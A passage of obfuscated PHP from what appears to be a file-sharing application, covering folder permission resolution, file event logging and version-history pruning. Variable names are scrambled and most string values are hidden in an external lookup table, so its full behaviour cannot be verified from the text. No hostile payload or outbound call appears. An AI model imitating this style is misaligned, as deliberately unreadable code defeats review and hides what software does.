$ÕŞÀ¶·ñ = $this->authFolderOwnerUser($ÌĞ¢ü•); $˜ÃÕ»ò[$™½ĞÚõ] = $ÕŞÀ¶·ñ; $®¾ä¬ƒ— = array_merge($®¾ä¬ƒ—, $ÕŞÀ¶·ñ[$õ¿³”¡Ÿ[596]]); if ($ÕŞÀ¶·ñ[$õ¿³”¡Ÿ[2001]]) { break; } } if (count($®¾ä¬ƒ—) == 0) { $®¾ä¬ƒ— = $this->authFolderOwnerGroup($Ï®óµ¡×[$õ¿³”¡Ÿ[506]]); } $®¾ä¬ƒ— = array_unique($®¾ä¬ƒ—); if (AuthModel::authCheckRoot($Ï®óµ¡×[$õ¿³”¡Ÿ[416]][$õ¿³”¡Ÿ[417]])) { $®¾ä¬ƒ—[] = USER_ID; } $Ï®óµ¡×[$õ¿³”¡Ÿ[416]][$õ¿³”¡Ÿ[2002]] = Model($õ¿³”¡Ÿ[515])->userListInfo($®¾ä¬ƒ—); return $Ï®óµ¡×; } private function authFolderOwnerGroup($å›÷ğ§ˆ) { $ıŒçåğğ =& $_SERVER[ë¦»ºéÌ]; $õ£ûêìî = Model($ıŒçåğğ[1889])->where(array($ıŒçåğğ[1800] => $å›÷ğ§ˆ))->select(); $İÜñåïÄ = array(); if (!$õ£ûêìî) { return $İÜñåïÄ; } foreach ($õ£ûêìî as $ éİüÆˆ) { $ÄŸ‡‚Ó = $this->authInfo($ éİüÆˆ); if (AuthModel::authCheckRoot($ÄŸ‡‚Ó[$ıŒçåğğ[416]])) { $İÜñåïÄ[] = $ éİüÆˆ[$ıŒçåğğ[1632]]; } } return $İÜñåïÄ; } private function authFolderOwnerUser($‹‡‹ÜÕ¦) { $ñÈ¥ôÁ© =& $_SERVER[ë¦»ºéÌ]; $åêş»øó = array(); $¯ÉêÚáÛ = !1; foreach ($‹‡‹ÜÕ¦ as $ô×êÅõ¤) { $«½ıÈ™© = $this->authInfo($ô×êÅõ¤); if ($ô×êÅõ¤[$ñÈ¥ôÁ©[506]] == $ñÈ¥ôÁ©[202]) { $¯ÉêÚáÛ = !0; } if ($ô×êÅõ¤[$ñÈ¥ôÁ©[414]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($«½ıÈ™©[$ñÈ¥ôÁ©[416]])) { $åêş»øó[] = $ô×êÅõ¤[$ñÈ¥ôÁ©[506]]; } } } return array($ñÈ¥ôÁ©[596] => $åêş»øó, $ñÈ¥ôÁ©[2001] => $¯ÉêÚáÛ); } public function authMake($Çë¾, $…½§ã = false) { $„è›˜©» =& $_SERVER[ë¦»ºéÌ]; $ğ²°ª«Ì = $this->authArrayCheck($Çë¾, $…½§ã); if ($ğ²°ª«Ì[$„è›˜©»[2003]]) { $ğ²°ª«Ì[$„è›˜©»[2003]] = $this->sourceAuthInfo($ğ²°ª«Ì[$„è›˜©»[2003]]); } return $ğ²°ª«Ì; } public function authArrayCheck($ò˜ğŞáû, $å½Œ”Ó¸ = false) { $â”Æ££ =& $_SERVER[ë¦»ºéÌ]; if (!$ò˜ğŞáû) { return array($â”Æ££[417] => 0, $â”Æ££[468] => !1); } $å½Œ”Ó¸ = $å½Œ”Ó¸ ? $å½Œ”Ó¸ : USER_ID; $÷½ç×²Î = 0; $œ›Ü…‘Ã = 0; $ÔÕ¼±ã = 0; $»À®şí = 0; $®¹‡îŒ = 0; $µõÁ¾Ê™ = 0; $ÆüÉî°û = 1000; $Å•×¿Ä = 0; $·ëùòº = 0; $éÔÚ¬Ø´ = 0; $·àÚÉ™‡ = 0; $¨®ó©ıƒ = array($â”Æ££[405] => 0); foreach ($ò˜ğŞáû as $¨®ó©ıƒ) { $¦¥‹–¡° = $this->authInfo($¨®ó©ıƒ); if (!$¦¥‹–¡°) { continue; } $‹øÂşÛÂ = $¨®ó©ıƒ[$â”Æ££[506]]; $ĞÚ—›ë” = intval($¦¥‹–¡°[$â”Æ££[416]]); if ($¨®ó©ıƒ[$â”Æ££[414]] == SourceModel::TYPE_USER && $‹øÂşÛÂ == $å½Œ”Ó¸) { $÷½ç×²Î = !0; $ÔÕ¼±ã = $¦¥‹–¡°; $œ›Ü…‘Ã = $ĞÚ—›ë”; } else { if ($¨®ó©ıƒ[$â”Æ££[414]] == SourceModel::TYPE_GROUP && $this->groupContainUser($‹øÂşÛÂ, $å½Œ”Ó¸)) { $»À®şí = !0; $Ö½ü ğ = $this->groupStepToUserGroup($‹øÂşÛÂ, $å½Œ”Ó¸); if ($Ö½ü ğ < $ÆüÉî°û) { $ÆüÉî°û = $Ö½ü ğ; $®¹‡îŒ = $ĞÚ—›ë”; $µõÁ¾Ê™ = $¦¥‹–¡°; $Å•×¿Ä = $‹øÂşÛÂ; } if ($Ö½ü ğ == $ÆüÉî°û && $ĞÚ—›ë” >= $®¹‡îŒ) { $®¹‡îŒ = $ĞÚ—›ë”; $µõÁ¾Ê™ = $¦¥‹–¡°; $Å•×¿Ä = $‹øÂşÛÂ; } } else { if ($‹øÂşÛÂ == $â”Æ££[202]) { $·ëùòº = !0; $·àÚÉ™‡ = $¦¥‹–¡°; $éÔÚ¬Ø´ = $ĞÚ—›ë”; } } } } if ($÷½ç×²Î) { $ƒƒß‰†ß = $œ›Ü…‘Ã; $¦¥‹–¡° = $ÔÕ¼±ã; $Ëç‘íàã = LNG($â”Æ££[2004]); } else { if ($»À®şí) { $ƒƒß‰†ß = $®¹‡îŒ; $¦¥‹–¡° = $µõÁ¾Ê™; $é¥øº½ = Model($â”Æ££[524])->getInfo($Å•×¿Ä); $Ëç‘íàã = $â”Æ££[171] . $é¥øº½[$â”Æ££[528]] . $â”Æ££[2005] . LNG($â”Æ££[2006]); } else { if ($·ëùòº) { $ƒƒß‰†ß = $éÔÚ¬Ø´; $¦¥‹–¡° = $·àÚÉ™‡; $Ëç‘íàã = LNG($â”Æ££[1977]); } else { $ƒƒß‰†ß = 0; $¦¥‹–¡° = !1; $Ëç‘íàã = $â”Æ££[12]; } } } $Æ‹†Íâø = array($â”Æ££[1996] => intval($ƒƒß‰†ß), $â”Æ££[1980] => $¦¥‹–¡°, $â”Æ££[1997] => $Ëç‘íàã, $â”Æ££[1989] => $¨®ó©ıƒ[$â”Æ££[405]]); return $Æ‹†Íâø; } private function groupContainUser($¨ò¸°õÒ, $”Ğ—«˜ = false) { return in_array($¨ò¸°õÒ, $this->userGroupParents($”Ğ—«˜)); } private function groupStepToUserGroup($Œ­ÕÓºí, $Ôñİáş = false) { $§±¸›¼‰ =& $_SERVER[ë¦»ºéÌ]; $ñØÁ°¤Ñ = $this->userGroupList($Ôñİáş); $¹ıÊ¿­¬ = 1000; $Ñ’¹¿È = $GLOBALS[$§±¸›¼‰[6]][$§±¸›¼‰[100]][$§±¸›¼‰[1900]] == 1; $±ş„Ã«İ = $Ñ’¹¿È ? 3 : 2; foreach ($ñØÁ°¤Ñ as $°ì¨³İ™) { if ($°ì¨³İ™[$§±¸›¼‰[1800]] == $Œ­ÕÓºí) { return 0; } $í§á¹êÕ = explode($§±¸›¼‰[60], trim($°ì¨³İ™[$§±¸›¼‰[523]], $§±¸›¼‰[60])); if ($í§á¹êÕ[0] == $§±¸›¼‰[202] && count($í§á¹êÕ) > $±ş„Ã«İ) { $‹ÜÚˆ–€ = array_reverse(array_slice($í§á¹êÕ, $±ş„Ã«İ)); $»á²´ªœ = array_search($Œ­ÕÓºí, $‹ÜÚˆ–€); if ($»á²´ªœ !== !1 && $»á²´ªœ + 1 <= $¹ıÊ¿­¬) { $¹ıÊ¿­¬ = $»á²´ªœ + 1; } } } return $¹ıÊ¿­¬; } private function userGroupList($é¸äÒìÆ = false) { $í‘ÃÒª© =& $_SERVER[ë¦»ºéÌ]; static $ÀàÓ×íÅ = array(); if (isset($ÀàÓ×íÅ[$é¸äÒìÆ])) { return $ÀàÓ×íÅ[$é¸äÒìÆ]; } $‹Ì¬™›ô = Model($í‘ÃÒª©[540])->getInfo($é¸äÒìÆ); $ÀàÓ×íÅ[$é¸äÒìÆ] = array_to_keyvalue($‹Ì¬™›ô[$í‘ÃÒª©[1978]], $í‘ÃÒª©[1800]); return $ÀàÓ×íÅ[$é¸äÒìÆ]; } public function userGroupParents($ù“²¦Ë) { $»Îú§½˜ =& $_SERVER[ë¦»ºéÌ]; static $÷ˆ±Ñ©Î = array(); $ù“²¦Ë = $ù“²¦Ë ? $ù“²¦Ë : USER_ID; if (isset($÷ˆ±Ñ©Î[$ù“²¦Ë])) { return $÷ˆ±Ñ©Î[$ù“²¦Ë]; } $ÏŸ‘ªƒÕ = $this->userGroupList($ù“²¦Ë); $‡‘¦Ê±— = array(); $²”±ùî¼ = $GLOBALS[$»Îú§½˜[6]][$»Îú§½˜[100]][$»Îú§½˜[1900]] == 1; $È—ŠÑ”‹ = $²”±ùî¼ ? 3 : 2; foreach ($ÏŸ‘ªƒÕ as $ˆ´ôŸ„) { $„Íİ³œó = array($ˆ´ôŸ„[$»Îú§½˜[1800]]); $‡ÒğÏ’ = explode($»Îú§½˜[60], trim($ˆ´ôŸ„[$»Îú§½˜[523]], $»Îú§½˜[60])); if ($‡ÒğÏ’[0] == $»Îú§½˜[202] && count($‡ÒğÏ’) > $È—ŠÑ”‹) { $ó†ÌÏœ = array_slice($‡ÒğÏ’, $È—ŠÑ”‹); $„Íİ³œó = array_merge($„Íİ³œó, array_reverse($ó†ÌÏœ)); } $‡‘¦Ê±— = array_merge($‡‘¦Ê±—, $„Íİ³œó); } $÷ˆ±Ñ©Î[$ù“²¦Ë] = array_unique($‡‘¦Ê±—); return $÷ˆ±Ñ©Î[$ù“²¦Ë]; } public function authTargetInfoMake($É–óùÓö) { $æÑÙ÷¬ =& $_SERVER[ë¦»ºéÌ]; $µÊ¤æÒë = array(); $Áá‚Àğ = array(); foreach ($É–óùÓö as $œêÂ¡Ñß) { if ($œêÂ¡Ñß[$æÑÙ÷¬[414]] == SourceModel::TYPE_USER) { $µÊ¤æÒë[] = intval($œêÂ¡Ñß[$æÑÙ÷¬[506]]); } else { if ($œêÂ¡Ñß[$æÑÙ÷¬[414]] == SourceModel::TYPE_GROUP) { $Áá‚Àğ[] = intval($œêÂ¡Ñß[$æÑÙ÷¬[506]]); } } } if ($µÊ¤æÒë) { $µÊ¤æÒë = Model($æÑÙ÷¬[515])->userListInfo($µÊ¤æÒë); } if ($Áá‚Àğ) { $Ïİà˜¸æ = array($æÑÙ÷¬[1887] => array($æÑÙ÷¬[421], $Áá‚Àğ)); $Áá‚Àğ = Model($æÑÙ÷¬[524])->field($æÑÙ÷¬[2007])->where($Ïİà˜¸æ)->select(); $Áá‚Àğ = array_to_keyvalue($Áá‚Àğ, $æÑÙ÷¬[1800]); } return array($æÑÙ÷¬[2008] => $µÊ¤æÒë, $æÑÙ÷¬[2009] => $Áá‚Àğ); } public function authInfo($¶°û¿’ú) { $İÀâŸÃŞ =& $_SERVER[ë¦»ºéÌ]; if ($¶°û¿’ú[$İÀâŸÃŞ[1901]]) { $Öè¼„ïõ = Model($İÀâŸÃŞ[509])->listData($¶°û¿’ú[$İÀâŸÃŞ[1901]]); if (!$Öè¼„ïõ) { return !1; $Óé¹Ÿ¼å = Model($İÀâŸÃŞ[509])->listData(); $¡‰ß¬÷• = array_filter_by_field($Óé¹Ÿ¼å, $İÀâŸÃŞ[416], $İÀâŸÃŞ[202]); return $¡‰ß¬÷•; } $Ç·¬Ééş = array_field_key($Öè¼„ïõ, array($İÀâŸÃŞ[403], $İÀâŸÃŞ[42], $İÀâŸÃŞ[416], $İÀâŸÃŞ[1822], $İÀâŸÃŞ[1823])); $Ç·¬Ééş[$İÀâŸÃŞ[2010]] = $¶°û¿’ú; return $Ç·¬Ééş; } else { return array($İÀâŸÃŞ[422] => 0, $İÀâŸÃŞ[1806] => $¶°û¿’ú[$İÀâŸÃŞ[1955]], $İÀâŸÃŞ[423] => $İÀâŸÃŞ[12], $İÀâŸÃŞ[1822] => $İÀâŸÃŞ[2011]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\162\x63\145\137\145\x76\x65\156\x74"; protected $dataAuto = array(array("\143\162\145\x61\x74\145\124\151\155\x65", "\164\151\155\x65", "\x69\156\x73\x65\162\164", "\x66\x75\x6e\x63\x74\x69\x6f\156"), array("\x64\x65\163\143", '', "\151\156\x73\x65\162\164\x2c\165\x70\144\x61\x74\145\x2c\x73\145\154\145\x63\164", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¿¦ã°¸, $üÛşÅ£Î, $Ä¯Ô£Ò = '') { $œóÒí­» =& $_SERVER[ë¦»ºéÌ]; if (!$this->eventSave) { return; } $„ï÷ß«„ = Model($œóÒí­»[1305])->sourceInfo($¿¦ã°¸); if (!$„ï÷ß«„) { return !1; } if ($this->isCacheEvent($„ï÷ß«„, $üÛşÅ£Î)) { return; } if ($Ä¯Ô£Ò && is_string($Ä¯Ô£Ò)) { $Ä¯Ô£Ò = array($œóÒí­»[1838] => $Ä¯Ô£Ò); } $Ïœè·ƒş = array($œóÒí­»[420] => $¿¦ã°¸, $œóÒí­»[2012] => $„ï÷ß«„[$œóÒí­»[500]], $œóÒí­»[2013] => $„ï÷ß«„[$œóÒí­»[42]], $œóÒí­»[521] => !empty($„ï÷ß«„[$œóÒí­»[521]]) ? $„ï÷ß«„[$œóÒí­»[521]] : $œóÒí­»[12], $œóÒí­»[1623] => USER_ID, $œóÒí­»[425] => $üÛşÅ£Î, $œóÒí­»[1625] => $Ä¯Ô£Ò); $this->addSystemLog($üÛşÅ£Î, $Ïœè·ƒş); unset($Ïœè·ƒş[$œóÒí­»[2013]], $Ïœè·ƒş[$œóÒí­»[521]]); return $this->add($Ïœè·ƒş); } private function addSystemLog($¥Œ©Øóö, $¦€ª·°í) { $‘Ê®ìäÔ =& $_SERVER[ë¦»ºéÌ]; if ($¥Œ©Øóö == $‘Ê®ìäÔ[2014]) { $¥Œ©Øóö = $¦€ª·°í[$‘Ê®ìäÔ[453]][$‘Ê®ìäÔ[2015]]; } else { if (in_array($¥Œ©Øóö, array($‘Ê®ìäÔ[1780], $‘Ê®ìäÔ[2016]))) { $¥Œ©Øóö = $¦€ª·°í[$‘Ê®ìäÔ[453]][$‘Ê®ìäÔ[739]]; } } $ÊİÒ«Áœ = array_merge($¦€ª·°í, array($‘Ê®ìäÔ[2017] => $¦€ª·°í[$‘Ê®ìäÔ[405]], $‘Ê®ìäÔ[2018] => $¦€ª·°í[$‘Ê®ìäÔ[2018]])); Hook::trigger($‘Ê®ìäÔ[2019], $‘Ê®ìäÔ[2020] . $¥Œ©Øóö, $¦€ª·°í); Model($‘Ê®ìäÔ[1744])->addLog($‘Ê®ìäÔ[2020] . $¥Œ©Øóö, $ÊİÒ«Áœ); } private function isCacheEvent($ƒ‹¹ø½ó, $£÷ÎÖİ) { if ($ƒ‹¹ø½ó[$_SERVER[ë¦»ºéÌ][414]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($İ®‡Ş‚, $‹ÕŒ€Öû) { $º˜Ğ‰ÈÔ =& $_SERVER[ë¦»ºéÌ]; $ºªê˜—³ = Model($º˜Ğ‰ÈÔ[1305])->sourceInfo($İ®‡Ş‚); $Üõßñ´¹ = array($º˜Ğ‰ÈÔ[2015] => $‹ÕŒ€Öû, $º˜Ğ‰ÈÔ[42] => $ºªê˜—³[$º˜Ğ‰ÈÔ[42]]); return $this->addEvent($İ®‡Ş‚, $º˜Ğ‰ÈÔ[2014], $Üõßñ´¹); } public function eventFileEdit($’¨§ÊÜ) { $Ûä×©àí =& $_SERVER[ë¦»ºéÌ]; $«„é¯Ë¯ = array($Ûä×©àí[2021] => $_SERVER[$Ûä×©àí[2022]], $Ûä×©àí[2023] => strtolower(ACTION)); return $this->addEvent($’¨§ÊÜ, $Ûä×©àí[1770], $«„é¯Ë¯); } public function eventRecycle($î•ñßç, $˜Ò›º´â) { return $this->addEvent($î•ñßç, $_SERVER[ë¦»ºéÌ][2016], $˜Ò›º´â); } public function eventRemove($Ä‡Ü¦·ö) { $Ã¬ŸŠ»ª =& $_SERVER[ë¦»ºéÌ]; $­»É­Íş = Model($Ã¬ŸŠ»ª[1305])->sourceInfo($Ä‡Ü¦·ö); $¤Ñâ´áú = $­»É­Íş[$Ã¬ŸŠ»ª[42]]; return $this->addEvent($­»É­Íş[$Ã¬ŸŠ»ª[500]], $Ã¬ŸŠ»ª[1769], $¤Ñâ´áú); } public function eventShare($¤–é´­Š, $şœ É„ì) { return $this->addEvent($¤–é´­Š, $_SERVER[ë¦»ºéÌ][1780], $şœ É„ì); } public function eventMove($ŠŠã’õÊ, $Ø¡•ÑÉ«, $â¿ğûÛ) { $º²»­Ç– =& $_SERVER[ë¦»ºéÌ]; $±‚·×ƒ = Model($º²»­Ç–[1305]); $ªÌğ‡ = $±‚·×ƒ->sourceInfo($ŠŠã’õÊ); $Õ¨íö‚Ô = $±‚·×ƒ->sourceInfo($Ø¡•ÑÉ«); $ÂÍŠ½Ù÷ = $±‚·×ƒ->sourceInfo($â¿ğûÛ); $éºŒ­ é = array($º²»­Ç–[1138] => $Ø¡•ÑÉ«, $º²»­Ç–[2024] => $Õ¨íö‚Ô[$º²»­Ç–[42]], $º²»­Ç–[2003] => !empty($Õ¨íö‚Ô[$º²»­Ç–[521]]) ? $Õ¨íö‚Ô[$º²»­Ç–[521]] : $º²»­Ç–[12], $º²»­Ç–[1139] => $â¿ğûÛ, $º²»­Ç–[2025] => $ÂÍŠ½Ù÷[$º²»­Ç–[42]], $º²»­Ç–[2026] => !empty($ÂÍŠ½Ù÷[$º²»­Ç–[521]]) ? $ÂÍŠ½Ù÷[$º²»­Ç–[521]] : $º²»­Ç–[12]); $this->addEvent($ŠŠã’õÊ, $º²»­Ç–[553], $éºŒ­ é); $ªÌğ‡ = $±‚·×ƒ->sourceInfo($ŠŠã’õÊ); $éºŒ­ é = array($º²»­Ç–[405] => $ªÌğ‡[$º²»­Ç–[405]], $º²»­Ç–[42] => $ªÌğ‡[$º²»­Ç–[42]]); $this->addEvent($Ø¡•ÑÉ«, $º²»­Ç–[2027], $éºŒ­ é); } public function eventCopy($ôŒİ»²ª) { $this->eventCreate($ôŒİ»²ª, $_SERVER[ë¦»ºéÌ][551]); } public function eventRename($ëµî¶òÚ, $ëö¬’÷§, $ç­Êåø‚) { $Ã•èØ‰ƒ =& $_SERVER[ë¦»ºéÌ]; $Ïµ¦¤Æ = array($Ã•èØ‰ƒ[1138] => $ëö¬’÷§, $Ã•èØ‰ƒ[1139] => $ç­Êåø‚); return $this->addEvent($ëµî¶òÚ, $Ã•èØ‰ƒ[1320], $Ïµ¦¤Æ); } public function eventAddComment($é’ûŠ î, $‘ÕÕäÔ) { return $this->addEvent($é’ûŠ î, $_SERVER[ë¦»ºéÌ][2028], $‘ÕÕäÔ); } public function eventAddDesc($¢èìÈ’, $’ê²ØŞ) { return $this->addEvent($¢èìÈ’, $_SERVER[ë¦»ºéÌ][2029], $’ê²ØŞ); } public function listBySource($§ßÏÃï¿) { $‚ñïÉˆû =& $_SERVER[ë¦»ºéÌ]; $¨´ÚÇÓ = Model($‚ñïÉˆû[1305])->sourceInfo($§ßÏÃï¿); $Û¡ÛòØ“ = array($‚ñïÉˆû[420] => $§ßÏÃï¿); if ($¨´ÚÇÓ[$‚ñïÉˆû[413]] == $‚ñïÉˆû[99]) { $™á•İì = Model($‚ñïÉˆû[1305])->listSearchChildren($§ßÏÃï¿, 20000); $™á•İì[] = $§ßÏÃï¿ . $‚ñïÉˆû[384]; $Û¡ÛòØ“ = array($‚ñïÉˆû[405] => array($‚ñïÉˆû[7], $™á•İì)); } $×––òĞ« = $this->where($Û¡ÛòØ“)->order($‚ñïÉˆû[2030])->selectPage(); if ($×––òĞ«[$‚ñïÉˆû[372]][$‚ñïÉˆû[373]] == 0) { $×––òĞ«[$‚ñïÉˆû[372]][$‚ñïÉˆû[373]] = 1; $×––òĞ«[$‚ñïÉˆû[375]] = array(array($‚ñïÉˆû[420] => $§ßÏÃï¿, $‚ñïÉˆû[2012] => $¨´ÚÇÓ[$‚ñïÉˆû[500]], $‚ñïÉˆû[1623] => $¨´ÚÇÓ[$‚ñïÉˆû[454]], $‚ñïÉˆû[425] => $‚ñïÉˆû[2031], $‚ñïÉˆû[426] => $¨´ÚÇÓ[$‚ñïÉˆû[205]], $‚ñïÉˆû[1625] => $‚ñïÉˆû[12])); } return $this->eventListParse($×––òĞ«, $§ßÏÃï¿); } private function eventListParse($½Ïˆ¥Œë, $Šİ¾¶„) { $€†øøÈø =& $_SERVER[ë¦»ºéÌ]; $Ò„´èÒû = $½Ïˆ¥Œë[$€†øøÈø[375]]; $ø±Ô˜ÁÓ = array_to_keyvalue($Ò„´èÒû, $€†øøÈø[12], $€†øøÈø[405]); $„±²µ‘ = array_to_keyvalue($Ò„´èÒû, $€†øøÈø[12], $€†øøÈø[2018]); foreach ($Ò„´èÒû as $äÁŠşŠñ) { $Íìé¡õ = $äÁŠşŠñ[$€†øøÈø[453]]; if ($äÁŠşŠñ[$€†øøÈø[43]] == $€†øøÈø[553] && isset($Íìé¡õ[$€†øøÈø[1138]])) { $ø±Ô˜ÁÓ[] = $Íìé¡õ[$€†øøÈø[1138]] . $€†øøÈø[12]; $ø±Ô˜ÁÓ[] = $Íìé¡õ[$€†øøÈø[1139]] . $€†øøÈø[12]; } if ($äÁŠşŠñ[$€†øøÈø[43]] == $€†øøÈø[2027] && isset($Íìé¡õ[$€†øøÈø[405]])) { $ø±Ô˜ÁÓ[] = $Íìé¡õ[$€†øøÈø[405]] . $€†øøÈø[12]; } } $ø±Ô˜ÁÓ = array_merge($ø±Ô˜ÁÓ, $„±²µ‘, array($Šİ¾¶„ . $€†øøÈø[12])); $ø±Ô˜ÁÓ = array_unique($ø±Ô˜ÁÓ); $ÙÅİËıï = array_unique(array_to_keyvalue($Ò„´èÒû, $€†øøÈø[12], $€†øøÈø[1632])); $åğüè™” = Model($€†øøÈø[540])->userListInfo($ÙÅİËıï); $·æÙ³“ş = Model($€†øøÈø[809])->sourceListInfo($ø±Ô˜ÁÓ, !0); foreach ($Ò„´èÒû as &$äÁŠşŠñ) { if ($äÁŠşŠñ[$€†øøÈø[43]] == $€†øøÈø[553] && isset($äÁŠşŠñ[$€†øøÈø[453]][$€†øøÈø[1138]])) { $äÁŠşŠñ[$€†øøÈø[453]][$€†øøÈø[1138]] = $·æÙ³“ş[$äÁŠşŠñ[$€†øøÈø[453]][$€†øøÈø[1138]]]; $äÁŠşŠñ[$€†øøÈø[453]][$€†øøÈø[1139]] = $·æÙ³“ş[$äÁŠşŠñ[$€†øøÈø[453]][$€†øøÈø[1139]]]; } if ($äÁŠşŠñ[$€†øøÈø[43]] == $€†øøÈø[2027] && isset($äÁŠşŠñ[$€†øøÈø[453]][$€†øøÈø[405]])) { $äÁŠşŠñ[$€†øøÈø[453]][$€†øøÈø[405]] = $·æÙ³“ş[$äÁŠşŠñ[$€†øøÈø[453]][$€†øøÈø[405]]]; } $äÁŠşŠñ[$€†øøÈø[97]] = $·æÙ³“ş[$äÁŠşŠñ[$€†øøÈø[405]]]; $äÁŠşŠñ[$€†øøÈø[2032]] = $·æÙ³“ş[$äÁŠşŠñ[$€†øøÈø[2018]]]; if ($äÁŠşŠñ[$€†øøÈø[43]] == $€†øøÈø[1769]) { $äÁŠşŠñ[$€†øøÈø[2032]] = $äÁŠşŠñ[$€†øøÈø[97]]; $äÁŠşŠñ[$€†øøÈø[2018]] = $äÁŠşŠñ[$€†øøÈø[2032]][$€†øøÈø[405]]; $äÁŠşŠñ[$€†øøÈø[97]] = !1; $äÁŠşŠñ[$€†øøÈø[405]] = $€†øøÈø[12]; } $äÁŠşŠñ[$€†øøÈø[1963]] = $åğüè™”[$äÁŠşŠñ[$€†øøÈø[1632]]]; } unset($äÁŠşŠñ); $½Ïˆ¥Œë[$€†øøÈø[375]] = $Ò„´èÒû; return $½Ïˆ¥Œë; } public function removeBySource($§…âøò) { $Ÿ¯½Ù„‹ = array($_SERVER[ë¦»ºéÌ][420] => $§…âøò); $this->where($Ÿ¯½Ù„‹)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\162\143\145\137\150\151\163\164\x6f\x72\x79"; public function historyCount($ıËÆ›ì) { $¦’öÛöÇ =& $_SERVER[ë¦»ºéÌ]; if (!$ıËÆ›ì) { return array(); } if (is_string($ıËÆ›ì) || is_int($ıËÆ›ì)) { $ıËÆ›ì = array($ıËÆ›ì); } $ÔŸşäŸå = array($¦’öÛöÇ[405], $¦’öÛöÇ[1832] => $¦’öÛöÇ[502]); $ÃÑ±¼æ = array($¦’öÛöÇ[405] => array($¦’öÛöÇ[7], $ıËÆ›ì)); $”“ûÁ¬ = $this->field($ÔŸşäŸå)->where($ÃÑ±¼æ)->group($¦’öÛöÇ[405])->select(); return array_to_keyvalue($”“ûÁ¬, $¦’öÛöÇ[405], $¦’öÛöÇ[502]); } public function addHistory($†¶ƒ›—¶, $„ãİ£ = '') { $šòªÓê =& $_SERVER[ë¦»ºéÌ]; $Şìú»µà = array($šòªÓê[420] => $†¶ƒ›—¶[$šòªÓê[405]], $šòªÓê[1623] => isset($†¶ƒ›—¶[$šòªÓê[456]]) ? $†¶ƒ›—¶[$šòªÓê[456]] : $†¶ƒ›—¶[$šòªÓê[454]], $šòªÓê[470] => $†¶ƒ›—¶[$šòªÓê[469]], $šòªÓê[581] => $†¶ƒ›—¶[$šòªÓê[90]], $šòªÓê[2033] => $„ãİ£); $ôú‹ôê = $GLOBALS[$šòªÓê[6]][$šòªÓê[100]][$šòªÓê[1187]]; if ($ôú‹ôê > 1) { $this->historyAutoClear($Şìú»µà[$šòªÓê[405]]); $this->add($Şìú»µà); } Hook::trigger($šòªÓê[2034], $Şìú»µà); Model($šòªÓê[2035])->eventFileEdit($†¶ƒ›—¶[$šòªÓê[405]]); } private function historyAutoClear($‹—‹ŸÀ) { $ÄØ‹ĞÎû =& $_SERVER[ë¦»ºéÌ]; $†Ş–ô½³ = Model($ÄØ‹ĞÎû[754])->get($ÄØ‹ĞÎû[1209]); $ÆÕ°ëç‡ = $GLOBALS[$ÄØ‹ĞÎû[6]][$ÄØ‹ĞÎû[100]][$ÄØ‹ĞÎû[1187]]; $‰‘®ø¬ù = $†Ş–ô½³ == $ÄØ‹ĞÎû[1210] ? 5 : $ÆÕ°ëç‡; if ($ÆÕ°ëç‡ <= 1) { $‰‘®ø¬ù = 1; } if ($‰‘®ø¬ù >= 500) { return; } $“°–ÅåĞ = array($ÄØ‹ĞÎû[420] => $‹—‹ŸÀ); $†ĞöãÖ = $this->field($ÄØ‹ĞÎû[2036])->where($“°–ÅåĞ)->order($ÄØ‹ĞÎû[2030])->select(); if (!$†ĞöãÖ || $‰‘®ø¬ù >= count($†ĞöãÖ)) { return; } $ÒÕÒô‰Æ = array_to_keyvalue($†ĞöãÖ, $ÄØ‹ĞÎû[12], $ÄØ‹ĞÎû[403]); $ÒÕÒô‰Æ = array_slice($ÒÕÒô‰Æ, $‰‘®ø¬ù); $ûŞŠÖ¥Õ = array_to_keyvalue($†ĞöãÖ, $ÄØ‹ĞÎû[12], $ÄØ‹ĞÎû[469]); $ûŞŠÖ¥Õ = array_slice($ûŞŠÖ¥Õ, $‰‘®ø¬ù); if (!$ÒÕÒô‰Æ || !$ûŞŠÖ¥Õ) { return; } $“°–ÅåĞ = array($ÄØ‹ĞÎû[422] => array($ÄØ‹ĞÎû[7], $ÒÕÒô‰Æ)); $this->where($“°–ÅåĞ)->delete(); Model($ÄØ‹ĞÎû[472])->remove($ûŞŠÖ¥Õ); } public function listData($ÚÉí·¥Õ) { $•¨¯ğµ =& $_SERVER[ë¦»ºéÌ]; $…ĞçŒ‘Ô = array($•¨¯ğµ[420] => $ÚÉí·¥Õ); $«Ü‚®ñÜ = $•¨¯ğµ[2037]; $íò™¿˜· = $this->field($«Ü‚®ñÜ)->where($…ĞçŒ‘Ô)->order($•¨¯ğµ[2030])->selectPage(); $this->_listAppendUser($íò™¿˜·[$•¨¯ğµ[375]]); $Í‹ş»œé = Model($•¨¯ğµ[754])->get($•¨¯ğµ[1209]); $ƒÎñŸ© = 5; if ($Í‹ş»œé == $•¨¯ğµ[1210]) { $íò™¿˜·[$•¨¯ğµ[375]] = array_slice($íò™¿˜·[$•¨¯ğµ[375]], 0, $ƒÎñŸ©); $íò™¿˜·[$•¨¯ğµ[372]] = array($•¨¯ğµ[2038] => 1, $•¨¯ğµ[2039] => 20, $•¨¯ğµ[2040] => 1, $•¨¯ğµ[2041] => count($íò™¿˜·[$•¨¯ğµ[375]])); } return $íò™¿˜·; } protected function _listAppendUser(&$¢ê¶Ğìï) { $šŸ—ª¼Ø =& $_SERVER[ë¦»ºéÌ]; $ıÙ…âæÊ = array_to_keyvalue($¢ê¶Ğìï, $šŸ—ª¼Ø[12], $šŸ—ª¼Ø[1632]); $äÅ¦ş‘· = Model($šŸ—ª¼Ø[540])->userListInfo($ıÙ…âæÊ); foreach ($¢ê¶Ğìï as &$ä‡ÉÌ„) { $×ıó˜·· = $ä‡ÉÌ„[$šŸ—ª¼Ø[1632]]; $ä‡ÉÌ„[$šŸ—ª¼Ø[454]] = $äÅ¦ş‘·[$×ıó˜··] ? $äÅ¦ş‘·[$×ıó˜··] : !1; } unset($ä‡ÉÌ„); } public function fileInfo($à€Ó÷Ê¸) { $ÒÄæş“ =& $_SERVER[ë¦»ºéÌ]; $Ô¤®ÛÎÔ = $this->tablePrefix; $­½´…èÓ = 